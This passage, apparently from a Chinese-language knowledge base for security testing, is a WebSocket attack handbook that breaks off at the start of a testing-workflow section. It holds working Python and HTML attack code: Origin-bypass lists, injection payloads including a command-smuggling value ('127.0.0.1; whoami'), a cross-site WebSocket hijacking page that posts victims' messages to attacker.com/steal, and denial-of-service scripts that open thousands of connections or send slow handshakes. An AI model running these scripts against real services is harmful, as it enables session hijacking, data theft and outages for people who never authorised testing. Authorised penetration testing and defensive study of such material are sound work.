# websocket-test · part 1 · part 1

> 分段 1/2。索引见 `websocket-test-p1.md`。

# websocket-test · part 1

> 分段 1/2。完整索引见 `websocket-test.md`。

## 一、原有知识库

# WebSocket 安全测试手册
## 一、WebSocket 基础

### 1.1 WebSocket 握手

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 1.2 识别 WebSocket

```bash
# 从 JS 文件中查找
grep -r "new WebSocket" *.js
grep -r "ws://" *.js
grep -r "wss://" *.js

# 从网络请求中查找（使用 js-reverse MCP）
list_network_requests()
# 查找 Upgrade: websocket 的请求
```

---
## 二、Origin 验证绕过

### 2.1 原理

```
WebSocket 连接应验证 Origin 头，防止跨站攻击

正常: Origin: https://target.com → 允许
攻击: Origin: https://attacker.com → 应拒绝

如果服务端不验证或验证不严格 → 跨站 WebSocket 劫持
```

### 2.2 测试方法

```python
import websocket

def test_origin_bypass(ws_url):
    """测试 Origin 验证"""
    
    origins_to_test = [
        "https://attacker.com",
        "https://target.com.attacker.com",
        "https://attacker.com.target.com",
        "null",
        "",
        "https://target.com:@attacker.com",
    ]
    
    for origin in origins_to_test:
        try:
            ws = websocket.create_connection(
                ws_url,
                header=[f"Origin: {origin}"]
            )
            
            print(f"[+] Origin 绕过成功: {origin}")
            
            # 尝试接收消息
            result = ws.recv()
            print(f"    接收到: {result[:100]}")
            
            ws.close()
            
        except Exception as e:
            print(f"[-] Origin 被拒绝: {origin}")
            print(f"    错误: {str(e)[:50]}")
```

### 2.3 Bash 测试

```bash
# websocat 测试
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# wscat 测试
wscat -c wss://target.com/chat --origin https://attacker.com
```

---
## 三、认证测试

### 3.1 认证方式

```
1. URL 参数: wss://target.com/chat?token=xxx
2. Cookie: 握手时自动发送
3. 自定义头: Sec-WebSocket-Protocol: token.xxx
4. 首条消息: {"type": "auth", "token": "xxx"}
```

### 3.2 测试认证缺失

```python
def test_ws_auth(ws_url):
    """测试 WebSocket 认证"""
    
    # 不带任何认证信息连接
    try:
        ws = websocket.create_connection(ws_url)
        
        print("[!] 无需认证即可连接")
        
        # 尝试发送消息
        ws.send('{"type": "message", "content": "test"}')
        
        # 接收响应
        result = ws.recv()
        print(f"响应: {result}")
        
        ws.close()
        
    except Exception as e:
        print(f"连接失败: {e}")
```

### 3.3 Token 重放测试

```python
def test_token_replay(ws_url, old_token):
    """测试 Token 是否可重放"""
    
    # 使用已过期/已注销的 token
    ws_url_with_token = f"{ws_url}?token={old_token}"
    
    try:
        ws = websocket.create_connection(ws_url_with_token)
        print("[!] Token 可重放")
        ws.close()
    except:
        print("[-] Token 不可重放")
```

---
## 四、消息注入

### 4.1 JSON 注入

```python
def test_message_injection(ws_url, token):
    """测试消息注入"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    # 正常消息
    normal_msg = '{"type": "message", "content": "Hello"}'
    ws.send(normal_msg)
    
    # 注入测试
    injection_payloads = [
        # XSS
        '{"type": "message", "content": "<script>alert(1)</script>"}',
        
        # SQL 注入
        '{"type": "search", "query": "test\' OR \'1\'=\'1"}',
        
        # 命令注入
        '{"type": "ping", "host": "127.0.0.1; whoami"}',
        
        # 类型混淆
        '{"type": "message", "userId": {"$ne": null}}',
        
        # 越权
        '{"type": "message", "targetUserId": "VICTIM_ID"}',
    ]
    
    for payload in injection_payloads:
        ws.send(payload)
        try:
            response = ws.recv()
            print(f"Payload: {payload[:50]}")
            print(f"Response: {response[:100]}")
        except:
            pass
    
    ws.close()
```

### 4.2 二进制消息注入

```python
def test_binary_injection(ws_url):
    """测试二进制消息"""
    
    ws = websocket.create_connection(ws_url)
    
    # 发送二进制数据
    binary_payloads = [
        b"\x00\x00\x00\x01",  # 畸形数据
        b"\xff" * 1000,       # 大量数据
        b"A" * 10000,         # 超长数据
    ]
    
    for payload in binary_payloads:
        ws.send_binary(payload)
        try:
            response = ws.recv()
            print(f"Binary payload sent, response: {response[:50]}")
        except:
            pass
    
    ws.close()
```

---
## 五、跨站 WebSocket 劫持（CSWSH）

### 5.1 原理

```
类似 CSRF，但针对 WebSocket

1. 受害者访问攻击者网站
2. 攻击者网站的 JS 连接到目标 WebSocket
3. 浏览器自动发送受害者的 Cookie
4. 攻击者通过 WebSocket 执行操作或窃取数据
```

### 5.2 PoC 页面

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC</title>
</head>
<body>
    <h1>跨站 WebSocket 劫持 PoC</h1>
    <div id="output"></div>
    
    <script>
        // 连接到目标 WebSocket
        const ws = new WebSocket('wss://target.com/chat');
        
        ws.onopen = function() {
            log('WebSocket 连接成功');
            
            // 发送消息
            ws.send(JSON.stringify({
                type: 'getMessages',
                limit: 100
            }));
        };
        
        ws.onmessage = function(event) {
            log('收到消息: ' + event.data);
            
            // 将数据发送到攻击者服务器
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: event.data
            });
        };
        
        ws.onerror = function(error) {
            log('错误: ' + error);
        };
        
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
        }
    </script>
</body>
</html>
```

### 5.3 防护检测

```python
def test_cswsh_protection(ws_url):
    """检测 CSWSH 防护"""
    
    # 1. 检查是否验证 Origin
    # 2. 检查是否使用 CSRF Token
    # 3. 检查是否验证 Sec-WebSocket-Key
    
    # 从恶意 Origin 连接
    try:
        ws = websocket.create_connection(
            ws_url,
            header=["Origin: https://attacker.com"]
        )
        print("[!] 无 CSWSH 防护（Origin 未验证）")
        ws.close()
    except:
        print("[+] 有 CSWSH 防护（Origin 验证）")
```

---
## 六、信息泄露

### 6.1 敏感数据泄露

```python
def monitor_ws_messages(ws_url, token):
    """监控 WebSocket 消息，查找敏感信息"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    sensitive_patterns = [
        r'\b\d{15,19}\b',  # 信用卡号
        r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
        r'\b\d{11}\b',  # 手机号
        r'password',
        r'token',
        r'secret',
    ]
    
    import re
    
    for _ in range(100):
        try:
            msg = ws.recv()
            
            for pattern in sensitive_patterns:
                if re.search(pattern, msg, re.IGNORECASE):
                    print(f"[!] 发现敏感信息: {pattern}")
                    print(f"    消息: {msg[:200]}")
        except:
            break
    
    ws.close()
```

### 6.2 使用 js-reverse MCP 分析

```python
# 使用 js-reverse MCP 的 get_websocket_messages
# 获取所有 WebSocket 消息

# 1. 打开目标页面
# 2. 触发 WebSocket 连接
# 3. 调用 get_websocket_messages()
# 4. 分析消息内容
```

---
## 七、DoS 攻击

### 7.1 大量连接

```python
import threading

def dos_connections(ws_url, count=1000):
    """DoS: 大量连接"""
    
    def connect():
        try:
            ws = websocket.create_connection(ws_url)
            # 保持连接
            while True:
                ws.recv()
        except:
            pass
    
    threads = []
    for _ in range(count):
        t = threading.Thread(target=connect)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
```

### 7.2 大消息攻击

```python
def dos_large_message(ws_url):
    """DoS: 发送超大消息"""
    
    ws = websocket.create_connection(ws_url)
    
    # 发送 10MB 消息
    large_msg = "A" * (10 * 1024 * 1024)
    ws.send(large_msg)
    
    ws.close()
```

### 7.3 慢速攻击

```python
def dos_slow_send(ws_url):
    """DoS: 慢速发送"""
    
    import socket
    import ssl
    import time
    
    # 建立 TCP 连接
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    # 发送 WebSocket 握手（慢速）
    handshake = (
        "GET /chat HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    
    # 每秒发送 1 字节
    for byte in handshake.encode():
        sock.send(bytes([byte]))
        time.sleep(1)
    
    sock.close()
```

---
## 八、测试工具

### 8.1 websocat

```bash
# 安装
# Linux: wget https://github.com/vi/websocat/releases/download/v1.11.0/websocat_linux64
# macOS: brew install websocat

# 连接 WebSocket
websocat wss://target.com/chat

# 带自定义头
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# 发送文件内容
cat payload.json | websocat wss://target.com/chat

# 保存接收的消息
websocat wss://target.com/chat > messages.txt
```

### 8.2 wscat

```bash
# 安装
npm install -g wscat

# 连接
wscat -c wss://target.com/chat

# 带 Origin
wscat -c wss://target.com/chat --origin https://attacker.com

# 带自定义头
wscat -c wss://target.com/chat -H "Authorization: Bearer TOKEN"
```

### 8.3 Python websockets 库

```python
import asyncio
import websockets

async def test_websocket():
    uri = "wss://target.com/chat"
    
    async with websockets.connect(uri) as websocket:
        # 发送消息
        await websocket.send('{"type": "message", "content": "test"}')
        
        # 接收消息
        response = await websocket.recv()
        print(f"收到: {response}")

asyncio.run(test_websocket())
```

---
## 九、实战测试流程

### 9.1 信息收集

```
1. 找到 WebSocket 端点（从 JS 文件或网络请求）
2. 分析握手过程（认证方式、Origin 检查）
